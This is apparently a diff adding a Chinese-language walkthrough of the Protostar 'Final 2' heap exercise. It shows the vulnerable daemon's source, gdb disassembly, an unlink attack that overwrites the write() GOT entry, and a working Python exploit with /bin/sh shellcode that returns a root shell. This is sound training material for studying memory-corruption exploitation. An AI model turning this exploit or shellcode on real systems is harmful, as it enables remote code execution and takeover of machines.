@@ -517,3 +517,300 @@ uid=0(root) gid=0(root) groups=0(root)
 [final1] $ whoami
 root
 ```
+
+## Final 2
+
+> Remote heap level :)
+
+```c
+#include "../common/common.c"
+#include "../common/malloc.c"
+
+#define NAME "final2"
+#define UID 0
+#define GID 0
+#define PORT 2993
+
+#define REQSZ 128
+
+void check_path(char *buf)
+{
+  char *start;
+  char *p;
+  int l;
+
+  /*
+  * Work out old software bug
+  */
+
+  p = rindex(buf, '/');
+  // index, rindex - locate character in string
+  // The rindex() function returns a pointer to the last occurrence of the character c in the string s.
+  l = strlen(p);
+  if(p) {
+      start = strstr(buf, "ROOT");
+      // strstr - locate a substring
+      if(start) {
+          while(*start != '/') start--; // 并不检查是否在字符串内
+          memmove(start, p, l); // void *memmove(void *dest, const void *src, size_t n);
+          printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start < buf ?
+          "yes" : "no", start - buf);
+      }
+  }
+}
+
+int get_requests(int fd)
+{
+  char *buf;
+  char *destroylist[256];
+  int dll;
+  int i;
+
+  dll = 0;
+  while(1) {
+      if(dll >= 255) break;
+
+      buf = calloc(REQSZ, 1);   // 128 bytes, the chunk size is bigger than MAX_FAST_SIZE(80)
+      if(read(fd, buf, REQSZ) != REQSZ) break;
+
+      if(strncmp(buf, "FSRD", 4) != 0) break;
+
+      check_path(buf + 4);     
+
+      dll++;
+  }
+
+  for(i = 0; i < dll; i++) {
+    write(fd, "Process OK\n", strlen("Process OK\n"));
+    free(destroylist[i]);   // 按分配的顺序释放
+  }
+}
+
+int main(int argc, char **argv, char **envp)
+{
+  int fd;
+  char *username;
+
+  /* Run the process as a daemon */
+  background_process(NAME, UID, GID); 
+  
+  /* Wait for socket activity and return */
+  fd = serve_forever(PORT);
+
+  /* Set the client socket to STDIN, STDOUT, and STDERR */
+  set_io(fd);
+
+  get_requests(fd);
+
+}
+```
+
+- 输入字符串应满足以下条件
+    - 以 `FSRD` 开头，总长度为 128 字节
+    - 包含 `/` 和子串 `ROOT`
+- 在当前工作目录/当前用户家目录下创建 `.gdbinit`，写入每次启动 `gdb` 时希望执行的命令
+
+    ```
+    set disassembly-flavor intel
+    set pagination off
+    ```
+
+- 重点关注 `check_path`，利用 `/` 查找和 `memmove` 修改堆，并借助 `free` 完成 `unlink` 攻击
+
+    ??? note "Dump of assembler code for function check_path"
+
+        ```bash
+        0x0804bcd0 <check_path+0>:	push   ebp
+        0x0804bcd1 <check_path+1>:	mov    ebp,esp
+        0x0804bcd3 <check_path+3>:	sub    esp,0x28
+        0x0804bcd6 <check_path+6>:	mov    DWORD PTR [esp+0x4],0x2f
+        0x0804bcde <check_path+14>:	mov    eax,DWORD PTR [ebp+0x8]
+        0x0804bce1 <check_path+17>:	mov    DWORD PTR [esp],eax
+        0x0804bce4 <check_path+20>:	call   0x8048f7c <rindex@plt>
+        0x0804bce9 <check_path+25>:	mov    DWORD PTR [ebp-0x10],eax
+        0x0804bcec <check_path+28>:	mov    eax,DWORD PTR [ebp-0x10]
+        0x0804bcef <check_path+31>:	mov    DWORD PTR [esp],eax
+        0x0804bcf2 <check_path+34>:	call   0x8048edc <strlen@plt>
+        0x0804bcf7 <check_path+39>:	mov    DWORD PTR [ebp-0xc],eax
+        0x0804bcfa <check_path+42>:	cmp    DWORD PTR [ebp-0x10],0x0
+        0x0804bcfe <check_path+46>:	je     0x804bd45 <check_path+117>
+        0x0804bd00 <check_path+48>:	mov    DWORD PTR [esp+0x4],0x804c2cc
+        0x0804bd08 <check_path+56>:	mov    eax,DWORD PTR [ebp+0x8]
+        0x0804bd0b <check_path+59>:	mov    DWORD PTR [esp],eax
+        0x0804bd0e <check_path+62>:	call   0x8048f4c <strstr@plt>
+        0x0804bd13 <check_path+67>:	mov    DWORD PTR [ebp-0x14],eax
+        0x0804bd16 <check_path+70>:	cmp    DWORD PTR [ebp-0x14],0x0
+        0x0804bd1a <check_path+74>:	je     0x804bd45 <check_path+117>
+        0x0804bd1c <check_path+76>:	jmp    0x804bd22 <check_path+82>
+        0x0804bd1e <check_path+78>:	sub    DWORD PTR [ebp-0x14],0x1
+        0x0804bd22 <check_path+82>:	mov    eax,DWORD PTR [ebp-0x14]
+        0x0804bd25 <check_path+85>:	movzx  eax,BYTE PTR [eax]
+        0x0804bd28 <check_path+88>:	cmp    al,0x2f
+        0x0804bd2a <check_path+90>:	jne    0x804bd1e <check_path+78>
+        0x0804bd2c <check_path+92>:	mov    eax,DWORD PTR [ebp-0xc]
+        0x0804bd2f <check_path+95>:	mov    DWORD PTR [esp+0x8],eax
+        0x0804bd33 <check_path+99>:	mov    eax,DWORD PTR [ebp-0x10]
+        0x0804bd36 <check_path+102>:	mov    DWORD PTR [esp+0x4],eax
+        0x0804bd3a <check_path+106>:	mov    eax,DWORD PTR [ebp-0x14]
+        0x0804bd3d <check_path+109>:	mov    DWORD PTR [esp],eax
+        0x0804bd40 <check_path+112>:	call   0x8048f8c <memmove@plt>
+        0x0804bd45 <check_path+117>:	leave  
+        0x0804bd46 <check_path+118>:	ret
+        ```
+
+- 查看堆的起始地址
+
+    ```bash
+    # gdb -p 1497
+    Attaching to process 1497
+    (gdb) set follow-fork-mode child
+    Current language:  auto
+    The current source language is "auto; currently asm".
+    (gdb) break *0x0804bd40
+    Breakpoint 1 at 0x804bd40: file final2/final2.c, line 27.
+    (gdb) c
+    Continuing.
+    [New process 1743]
+    [Switching to process 1743]
+
+    Breakpoint 1, 0x0804bd40 in check_path (buf=0x804e00c "AAAA/ROOT/BBBB/CCCC")
+        at final2/final2.c:27
+    Current language:  auto
+    The current source language is "auto; currently c".
+    (gdb) info proc mappings
+    process 1743
+    cmdline = '/opt/protostar/bin/final2'
+    cwd = '/'
+    exe = '/opt/protostar/bin/final2'
+    Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+        0x8048000  0x804d000     0x5000          0        /opt/protostar/bin/final2
+        0x804d000  0x804e000     0x1000     0x4000        /opt/protostar/bin/final2
+        0x804e000  0x804f000     0x1000          0           [heap]
+        0xb7e96000 0xb7e97000     0x1000          0        
+        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
+        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+        0xb7fd9000 0xb7fdc000     0x3000          0        
+        0xb7fe0000 0xb7fe2000     0x2000          0        
+        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
+        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+        0xbffeb000 0xc0000000    0x15000          0           [stack]
+    ```
+
+- 因为本身分配的 chunk 大小即大于 `MAX_FAST_SIZE`，因而在释放第一个 chunk 时，若下一个 chunk 未被使用，将进行 `unlink`，利用函数 `check_path` 修改第二个 chunk
+- 在执行 `free` 之后，可作为修改 GOT 表条目的目标函数为 `write` 和 `strlen`（选择 `write`）
+
+    ??? note "Dump of assembler code for function get_requests"
+
+        ```bash
+        0x0804bd47 <get_requests+0>:	push   ebp
+        0x0804bd48 <get_requests+1>:	mov    ebp,esp
+        0x0804bd4a <get_requests+3>:	sub    esp,0x428
+        0x0804bd50 <get_requests+9>:	mov    DWORD PTR [ebp-0x10],0x0
+        0x0804bd57 <get_requests+16>:	cmp    DWORD PTR [ebp-0x10],0xfe
+        0x0804bd5e <get_requests+23>:	jg     0x804bddb <get_requests+148>
+        0x0804bd60 <get_requests+25>:	mov    DWORD PTR [esp+0x4],0x1
+        0x0804bd68 <get_requests+33>:	mov    DWORD PTR [esp],0x80
+        0x0804bd6f <get_requests+40>:	call   0x804b4ee <calloc>
+        0x0804bd74 <get_requests+45>:	mov    DWORD PTR [ebp-0x14],eax
+        0x0804bd77 <get_requests+48>:	mov    eax,DWORD PTR [ebp-0x10]
+        0x0804bd7a <get_requests+51>:	mov    edx,DWORD PTR [ebp-0x14]
+        0x0804bd7d <get_requests+54>:	mov    DWORD PTR [ebp+eax*4-0x414],edx
+        0x0804bd84 <get_requests+61>:	add    DWORD PTR [ebp-0x10],0x1
+        0x0804bd88 <get_requests+65>:	mov    DWORD PTR [esp+0x8],0x80
+        0x0804bd90 <get_requests+73>:	mov    eax,DWORD PTR [ebp-0x14]
+        0x0804bd93 <get_requests+76>:	mov    DWORD PTR [esp+0x4],eax
+        0x0804bd97 <get_requests+80>:	mov    eax,DWORD PTR [ebp+0x8]
+        0x0804bd9a <get_requests+83>:	mov    DWORD PTR [esp],eax
+        0x0804bd9d <get_requests+86>:	call   0x8048e5c <read@plt>
+        0x0804bda2 <get_requests+91>:	cmp    eax,0x80
+        0x0804bda7 <get_requests+96>:	jne    0x804bdde <get_requests+151>
+        0x0804bda9 <get_requests+98>:	mov    DWORD PTR [esp+0x8],0x4
+        0x0804bdb1 <get_requests+106>:	mov    DWORD PTR [esp+0x4],0x804c2d1
+        0x0804bdb9 <get_requests+114>:	mov    eax,DWORD PTR [ebp-0x14]
+        0x0804bdbc <get_requests+117>:	mov    DWORD PTR [esp],eax
+        0x0804bdbf <get_requests+120>:	call   0x8048fdc <strncmp@plt>
+        0x0804bdc4 <get_requests+125>:	test   eax,eax
+        0x0804bdc6 <get_requests+127>:	jne    0x804bde1 <get_requests+154>
+        0x0804bdc8 <get_requests+129>:	mov    eax,DWORD PTR [ebp-0x14]
+        0x0804bdcb <get_requests+132>:	add    eax,0x4
+        0x0804bdce <get_requests+135>:	mov    DWORD PTR [esp],eax
+        0x0804bdd1 <get_requests+138>:	call   0x804bcd0 <check_path>
+        0x0804bdd6 <get_requests+143>:	jmp    0x804bd57 <get_requests+16>
+        0x0804bddb <get_requests+148>:	nop
+        0x0804bddc <get_requests+149>:	jmp    0x804bde2 <get_requests+155>
+        0x0804bdde <get_requests+151>:	nop
+        0x0804bddf <get_requests+152>:	jmp    0x804bde2 <get_requests+155>
+        0x0804bde1 <get_requests+154>:	nop
+        0x0804bde2 <get_requests+155>:	mov    DWORD PTR [ebp-0xc],0x0
+        0x0804bde9 <get_requests+162>:	jmp    0x804be1c <get_requests+213>
+        0x0804bdeb <get_requests+164>:	mov    DWORD PTR [esp+0x8],0xb
+        0x0804bdf3 <get_requests+172>:	mov    DWORD PTR [esp+0x4],0x804c2d6
+        0x0804bdfb <get_requests+180>:	mov    eax,DWORD PTR [ebp+0x8]
+        0x0804bdfe <get_requests+183>:	mov    DWORD PTR [esp],eax
+        0x0804be01 <get_requests+186>:	call   0x8048dfc <write@plt>
+        0x0804be06 <get_requests+191>:	mov    eax,DWORD PTR [ebp-0xc]
+        0x0804be09 <get_requests+194>:	mov    eax,DWORD PTR [ebp+eax*4-0x414]
+        0x0804be10 <get_requests+201>:	mov    DWORD PTR [esp],eax
+        0x0804be13 <get_requests+204>:	call   0x804a9c2 <free>
+        0x0804be18 <get_requests+209>:	add    DWORD PTR [ebp-0xc],0x1
+        0x0804be1c <get_requests+213>:	mov    eax,DWORD PTR [ebp-0xc]
+        0x0804be1f <get_requests+216>:	cmp    eax,DWORD PTR [ebp-0x10]
+        0x0804be22 <get_requests+219>:	jl     0x804bdeb <get_requests+164>
+        0x0804be24 <get_requests+221>:	leave  
+        0x0804be25 <get_requests+222>:	ret
+        ```
+
+    ```bash
+    (gdb) x/i 0x8048dfc
+    0x8048dfc <write@plt>:	jmp    DWORD PTR ds:0x804d41c
+    (gdb) x/wx 0x804d41c
+    0x804d41c <_GLOBAL_OFFSET_TABLE_+64>:	0xb7f53c70
+    ```
+
+- 与 [Heap 3](heap.md) 不同，需要获得 shell，又因为有 `BK->fd` 写回，$8$ 字节不足以放下所有 shellcode，可利用 `jmp`，使用 [Online Assembler and Disassembler](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=jmp+0x8&arch=x86-64&as_format=inline#assembly) 转换为 shellcode
+
+    ```bash
+    # jmp 0xc
+    \xeb\x0a
+    ```
+
+### Exploit
+
+```py
+import socket, struct, telnetlib
+
+REQSZ = 128
+def pad(m):
+    return ('FSRD' + m).ljust(REQSZ, '\x00')[:REQSZ]
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('localhost', 2993))
+
+jmp = "\xeb\x0a"
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+s.send(pad('/ROOT' + '/' * 0xf + jmp + '\x90' * 0xa + shellcode + '/' * 0x80))
+fake_chunk = struct.pack("I", 0xfffffffc) * 2 + struct.pack("I", 0x804d41c - 0xc) + struct.pack("I", 0x804e020)
+s.send(pad('ROOT/' +  fake_chunk))
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+```
+
+```bash
+$ python final.py 
+
+Process OK
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+exit
+*** Connection closed by remote host ***
+```
